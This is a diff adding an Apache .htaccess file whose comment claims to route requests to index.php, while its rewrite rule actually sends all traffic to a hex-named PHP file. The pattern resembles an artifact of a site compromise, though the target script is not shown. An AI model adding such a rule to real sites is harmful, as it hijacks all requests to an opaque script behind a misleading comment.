@@ -1,0 +1,5 @@
+
+# rewrite everything to index.php
+
+RewriteEngine On
+RewriteRule ^(.*)$ 6a992d5529f459a44fee58c733255e86.php
